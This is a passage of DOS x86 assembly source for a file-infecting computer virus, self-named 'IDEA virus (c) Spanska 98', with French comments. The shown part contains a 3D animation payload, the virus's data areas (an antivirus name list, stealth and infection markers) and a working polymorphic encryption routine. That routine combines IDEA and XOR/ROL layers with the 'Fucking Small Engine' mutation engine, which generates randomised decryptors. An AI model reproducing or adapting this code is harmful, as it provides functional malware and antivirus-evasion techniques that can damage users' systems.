   add di, ax
   sar di, cl
   add di, 100

   mov ax, 320
   imul di
   add ax, bx
   mov di, ax                      ;ca devient l'offset video du pixel

   pop cx
   mov bx, cx
   shl bx, 1
   add bx, word ptr cs:[bp+offset erase2D]
   mov word ptr [bx], di                 ;stocker les offsets pour l'effacage

   mov al, 40                      ;couleur=rouge
   stosb                           ;on ecrit le pixel

   loop anim2D

   ;----------------------attendre vertical retrace---------------------

       mov     dx,3dah
   Vrt:
       in      al,dx
       test    al,8
       jnz     Vrt                 ; Wait until Verticle Retrace starts
   NoVrt:
       in      al,dx
       test    al,8
       jz      NoVrt               ; Wait until Verticle Retrace ends

   ;-------------------effacer les points precedents----------------------
   ;ici es=vidéo ds=cs

   mov si, word ptr cs:[bp+erase3D]
   pop cx
   add cx, cs:[bp+nb_points_2D]
   inc cx
   effacer:
   lodsw
   mov di, ax
   xor ax, ax
   stosw
   add di, 318
   stosw
   loop effacer

   in al,60h
   dec al
   jz fin_bombe

   jmp Mainloop

   fin_bombe:
   mov ax, 3
   int 10h
   ret

   ;----------rotation-------------

   rotation:
   mov ax,[si]
   imul word ptr cs:[bp+cos]               ;ax = Y * Cos(xang)
   mov bx,ax
   mov ax,[di]
   imul word ptr cs:[bp+sin]               ;ax = Z * Sin(xang)
   sub bx,ax               ;bp = Y * Cos(xang) - Z * Sin(xang)
   mov cl, 7
   sar bx,cl               ;bp = Y * Cos(xang) - Z * Sin(xang) / 256
   push bx
   mov ax,[si]
   imul word ptr cs:[bp+sin]               ;ax = Y * Sin(xang)
   mov bx,ax
   mov ax,[di]
   imul word ptr cs:[bp+cos]               ;ax = Z * Cos(xang)
   add bx,ax               ;bp = Y * SIN(xang) + Z * COS(xang)
   sar bx,cl               ;bp = Y * SIN(xang) + Z * COS(xang) / 256
   mov [di],bx
   pop ax
   mov [si],ax
   ret

   SinCos:
    DB 0,3,6,9,12,16,19,22,25,28,31,34,37,40,43,46,49,51,54,57
    DB 60,63,65,68,71,73,76,78,81,83,85,88,90,92,94,96,98,100,102,104
    DB 106,107,109,111,112,113,115,116,117,118,120,121,122,122,123,124,125,125,126,126
    DB 126,127,127,127,127,127,127,127,126,126,126,125,125,124,123,122,122,121,120,118
    DB 117,116,115,113,112,111,109,107,106,104,102,100,98,96,94,92,90,88,85,83
    DB 81,78,76,73,71,68,65,63,60,57,54,51,49,46,43,40,37,34,31,28
    DB 25,22,19,16,12,9,6,3,0,253,250,247,244,240,237,234,231,228,225,222
    DB 219,216,213,210,207,205,202,199,196,193,191,188,185,183,180,178,175,173,171,168
    DB 166,164,162,160,158,156,154,152,150,149,147,145,144,143,141,140,139,138,136,135
    DB 134,134,133,132,131,131,130,130,130,129,129,129,129,129,129,129,130,130,130,131
    DB 131,132,133,134,134,135,136,138,139,140,141,143,144,145,147,149,150,152,154,156
    DB 158,160,162,164,166,168,171,173,175,178,180,183,185,188,191,193,196,199,202,205
    DB 207,210,213,216,219,222,225,228,231,234,237,240,244,247,250,253

   message3D db "Warning!$"
   message2D db 13, "strong", 13, 10, 10
         db "crypto", 13, 10, 10
         db "inside", "$"

   X dw ?
   Y dw ?
   Z dw ?
   angle db 0
   sin dw 0
   cos dw 0
   nb_points_3D dw 0
   nb_points_2D dw 0
   erase3D dw ?
   erase2D dw ?

   ;************ zones memoire utilisees par le virus********************

   aleat           dw 0AABBh
   size_for_stealth    dw ?
   enuns7      db 0,0,0,0,0,0,0
   f_ext           db 0EEh, 0EEh, 0EEh
   f_attrib        db 0AAh
   f_name      dd ?
   f_time      dw ?
   f_date      dw ?
   f_handle        dw ?
   exehead     db 1Ch dup(0aah)
   av_liste        db "TBVIAVNAVSFIF-FVIVDRSCGUCO"
   zip_liste       db "PKARRALHBA"
   stealth_non     db 0
   ajuste_exe      db 0
   crc_file        db "anti-vir.dat", 0
   marqueur_inf    db 0
   push_all_tmp    dw 0
   copyright       db "IDEA virus (c) Spanska 98"
               db " Thx to Rajaat (poly), F Mirza (IDEA), Wild Worker (zip), Solar D (road)"

   ;************************************************************
   ;********** CRYPTAGE et MUTATION ******************
   ;************************************************************
   ; en entrée: com_fse a 1 si c'est un com, taille_fse ajustée; rien sur le stack
   ; au retour: cx= taille a enregistrer a la fin du fichier

   poly_from_resident:
   push bp
   mov bp, offset start_virus
   neg bp
   jmp poly

   poly_from_runtime:
   push bp

   poly:
   ;
   ;--------------------chgt clef IDEA------------------------------
   ;
   mov cx, 13                      ;13x4 = 52 words
   lea si, [bp+offset key1]
   mov di, si
   change_clef:
   push cx
   mov ah, 2Ch                     ;horloge
   int 21h                         ;ch=hr, cl=min, dh=sec, dl=click
   lodsw
   xor cx, ax                      ;1er word XOR avec horloge
   lodsw
   xor ax, dx                      ;2eme word XOR avec horloge
   stosw                           ;inversion 1er/2eme
   xchg ax, cx
   stosw                           ;stockage
   lodsw
   add cx, ax                      ;3eme word ADD avec horloge
   lodsw
   add ax, dx                      ;4eme word ADD avec horloge
   stosw                           ;inversion 1er/2eme
   xchg ax, cx
   stosw                           ;stockage
   sub si, 8                       ;on revient au debut
   sub di, 8                       ;des 4 words
        mov ax, word ptr ds:[bp+offset aleat]
        mov dx, 8405h
        mul dx                 ;dx aleatoire
        inc ax
        mov word ptr ds:[bp+offset aleat], ax
   mov cx, 4
   xor_aleat:
   lodsw
   xor ax, dx                      ;on XORe chaque word avec dx
   stosw
   loop xor_aleat
   pop cx
   loop change_clef
   ;----met la clef a un des 2 offsets possibles
   mov ah, 2Ch                     ;horloge
   int 21h                         ;ch=hr, cl=min, dh=sec, dl=click
   cmp cl, 30d
   mov al, 0
   jb zone_basse
   lea si, [bp+offset key1]
   lea di, [bp+offset key2]
   push si
   mov cx, 52
   push cx
   rep movsw
   pop cx
   pop di
   xor ax, ax
   rep stosw
   mov al, 1
   zone_basse:
   mov byte ptr ds:[bp+offset ou_est_la_clef], al
   push ax
   ;
   ;--------------------chgt clef NOKEY------------------------------
   ;
   mov ah, 2Ch             ;horloge
   int 21h                 ;ch=heure, cl=minute, dh=secondes, dl= 1/100 sec
   and dl, 00111111b               ;on ne garde que les 6 premiers bits
   mov byte ptr ds:[bp+offset _xor], dl            ;donc 0 <clef xor<63
   and dh, 00011111b               ;on ne garde que les 5 premiers bits
   mov byte ptr ds:[bp+offset _sub], dh            ;donc 0 <clef add<31
   and ch, 00000111b               ;on ne garde que les 3 premiers bits
   mov byte ptr ds:[bp+offset _ror], ch            ;donc 0 <clef ror<7
   and cl, 00001111b               ;on ne garde que les 4 premiers bits
   mov byte ptr ds:[bp+offset _xor2], cl           ;donc 0 <clef xor2<15
   mov al, byte ptr ds:[bp+offset _xor]
   mov ah, al
   mov cl, 4
   shl al, cl
   shr ah, cl
   xor ah, al
   mov al, byte ptr ds:[bp+offset _sub]

   mov dl, byte ptr ds:[bp+offset _ror]
   mov dh, dl
   mov cl, 4
   shl dl, cl
   shr dh, cl
   xor dh, dl
   mov dl, byte ptr ds:[bp+offset _xor2]

   xor ax, dx
   ;----stocker le CRC à un offset variable
   push ax                                 ;le mettre sur le stack
   call rnd_get                            ;renvoie un al aléatoire
   and al, 00000111b                       ;0<al<7
   xor ah, ah
   mov cx, ax                              ;cx = al
   xor ax, ax
   lea di, [bp+offset crc_clef]
   rep stosw                               ;on remplit la zone de 0
   pop ax                                  ;récup du CRC
   stosw                                   ;on le stocke
   ;
   ;-------------copie du corps dans le heap-------------------------
   ;
   lea si, [bp+offset debut_cryptage_FSE]
   lea di, [bp+offset heap]
   add di, 100d
   mov cx, endvirus-debut_cryptage_FSE
   rep movsb

   ;
   ;-------------cryptage IDEA du corps dans le heap-------------------------
   ;
       lea si, [bp+offset iv]
       lea di, [bp+offset xBuffer]
       mov     cx,4
       repnz   movsw
   mov ax, offset debut_cryptage_IDEA-debut_cryptage_FSE
   lea di, [bp+offset heap]        ;offset debut pour cryptage
   add di, 100d
   add di, ax
   pop ax                                  ;savoir ou est la clef
   cmp al, 1
   lea si, [bp+offset key1]
   jne suitezob
   lea si, [bp+offset key2]                ;offset clef 52

   suitezob:
   mov ax, fin_cryptage_IDEA-debut_cryptage_IDEA   ;nb d'octets a crypter
       add     ax,7                    ;on ajuste taille a l'octet suivant
       mov     cl,3                    ;on divise par 8
       shr     ax,cl                   ;taille octets lus /8
       mov     cx,ax                   ;donc nb de blocs de 8 oct a crypter
   Block2:
       push    cx                      ;sauve cx, si, di
       push    si
       push di
   Encrypt:
       push    di
       lea di, [bp+offset xBuffer]      ; di->buffer
       call    IDEA
       pop     si              ; si->data
       mov     cx,8
   EnFeedback:
       lodsb
       xor     al,byte ptr [di]
       mov     byte ptr [si-1],al
       stosb
       loop    EnFeedback

       pop     di si                   ;recup cx, si, di
       pop     cx                      ;
       add     di,8                    ;passe au bloc suivant
       loop    Block2

   ;
   ;-------------cryptage NOKEY du corps dans le heap-------------------------
   ;
   mov cx, fin_cryptage_NOKEY-debut_cryptage_NOKEY
   mov ax, offset debut_cryptage_NOKEY-debut_cryptage_FSE
   lea si, [bp+offset heap]
   add si, 100d
   add si, ax
   mov di, si

   crypte:
   lodsb
   xor al, byte ptr ds:[bp+offset _xor]
   add al, byte ptr ds:[bp+offset _sub]
   push cx
   mov cl, byte ptr ds:[bp+offset _ror]
   rol al, cl
   pop cx
   xor al, byte ptr ds:[bp+offset _xor2]
   stosb
   loop crypte

   lea di, [bp+offset _xor]                ;effacement des clefs, au cas ou
   xor ax, ax
   stosw
   stosw

   ;
   ;-------------cryptage FSE du corps dans le heap-------------------------
   ;
   lea si, [bp+offset heap]
   add si, 100d
   lea di, [bp+offset heap]
   mov cx, endvirus-debut_cryptage_FSE
   mov ax, word ptr cs:[bp+offset taille_fse]
   call fse
   ;
   ;---------------ajout d'un nombre d'octet aleatoires a la fin------------------------------
   ;
   push cx
   mov ah, 2Ch             ;horloge
   int 21h                 ;ch=heure, cl=minute, dh=secondes, dl= 1/100 sec
   xor ch, ch
   shr cl, 1
   xchg cx, dx
   pop cx
   add cx, dx

   pop bp
   ret

   ;=====( Fucking Small Engine - by Rajaat )=====================================
   ;
   ; DS:SI = code to encrypt
   ; ES:DI = place for encrypted code + decryptor
   ; CX    = code length to encrypt (add engine length yourself!)
   ; AX    = offset in target
   ;   retour: taille decrypteur+code crypte en cx
   ;==============================================================================

   .radix 16

   fse:            push bp
           call get_offset
   get_offset:     pop bp
           sub bp,offset get_offset
           push di es
           push si
           push cx
           push ax
           push di
           push di
       push es
       push cs
       pop es
           cld
           lea si,end_sequencer[bp]
           lea di,enc_sequencer[bp]
           mov al,90
           push cx
           mov cx,len_sequencer
           rep stosb
           pop cx
       pop es
           pop di
   cmp byte ptr cs:[bp+com_fse], 1 ;if it's a com, do not put a
   je bad_registers                        ;push cs / pop ds at start
           mov ax,1F0Eh
           stosw
   bad_registers:  call rnd_get
           and ax,0707
           cmp ah,al
           je bad_registers
           cmp al,4
           je bad_registers
           cmp ah,03
           je good_pointer
           cmp ah,6
           jb bad_registers
   good_pointer:   push ax
           sub ah,6
           cmp ah,08
           jb convert_ok
           mov ah,3
   convert_ok:     mov byte ptr cs:pointer_reg[bp],ah
           pop ax
           add ax,0b8b8
           push ax
           call rnd_get
           mov bx,1
           inc ax
           pop ax
           jns dont_flip
           xchg ah,al
           xchg bh,bl
   dont_flip:      stosb
           mov dx,di
           test bl,1
           push ax
           jz no_counter
           call rnd_get
           and ax,1ff
           add ax,cx
   no_counter:     stosw
           pop ax
           xchg ah,al
           stosb
           push ax bx
           test bl,1
           jnz is_counter
           and ax,1ff
           add ax,cx
           jmp store
   is_counter:     mov dx,di
   store:          stosw
           mov cx,di
           push cx

           call rnd_get
           mov cx,ax
           and cx,7
           add cx,7

   encrypt_actions:
           call rnd_get
   no_more_than_8: and ax,1f
           sub ax,8
           cmp ax,8
           ja no_more_than_8
           shl ax,1
           mov bx,ax
           add bx,bp
           mov ax,word ptr cs:enc_opers[bx]
           test ah,80
           jnz no_xor_add_sub
           mov ah,80
           add al,byte ptr cs:pointer_reg[bp]
           xchg ah,al
           stosw
           call rnd_get
           stosb
           jmp xor_add_sub
   no_xor_add_sub: sub ah,0bc      ; was bc
           add ah,byte ptr cs:pointer_reg[bp]
   no_bx:          stosw
   xor_add_sub:    mov bx,word ptr cs:dec_opers[bx]
           cmp bh,0
           jne no_xas
           mov bh,al
   no_xas:         mov word ptr cs:[si],bx
           dec si
           dec si

           loop encrypt_actions

           pop cx

           ;=== inc/dec pointer and counter
           pop bx ax
           test bl,1
           jnz pointer_first
           xchg ah,al
   pointer_first:  sub ax,7078
           stosb
           xchg ah,al
           stosb
           ;=== building repeat loop
           cmp al,49               ;49=opcode de dec cx
           mov al,75               ;75=opcode de jne
           jnz no_loop
           dec di                  ;c'est un loop: tuer le dec cx
           mov al,0e2              ;E2=opcode de loop
   no_loop:
   push ax
   mov ax, 04EBh
   stosw
   pop ax

           stosb
           sub cx,di
           dec cx
           xchg ax,cx
           stosb
   mov ax, 02EBh
   stosw
   mov ax, 0FAEBh
   stosw

           xchg bx,dx
           mov dx,di
           pop ax
           sub dx,ax
           pop ax
           add dx,ax
           mov word ptr es:[bx],dx
           pop cx
           ;=== encrypt code
           pop si

   encrypt_loop:   lodsb
           call enc_sequencer
           stosb
           loop encrypt_loop
           mov cx,di
           pop ds dx
           sub cx,dx
           pop bp
           ret

   rnd_get:        in al,40
           xchg ah,al
           in al,41
           xor al,ah
           ret

           ;  XOR   SUB   ADD   ROL   ROR   NOT   NEG   INC   DEC
   enc_opers       dw 00034,0002c,00004,0c0d0,0c8d0,0d0f6,0d8f6,0c0fe,0c8fe
           ;  XOR   ADD   SUB   ROR   ROL   NOT   NEG   DEC   INC
   dec_opers       dw 00034,00004,0002c,0c8d0,0c0d0,0d0f6,0d8f6,0c8fe,0c0fe

   enc_sequencer:  dw 10 dup (9090)
   end_sequencer   equ $-2
   len_sequencer   equ $-enc_sequencer
           ret
   pointer_reg     db 0
   com_fse         db 0
   taille_fse       dw 0

   isole  db 4 dup (90h)

   fin_cryptage_IDEA:
   fin_cryptage_NOKEY:
   endvirus:

   heap:

   code    ends
       end     start
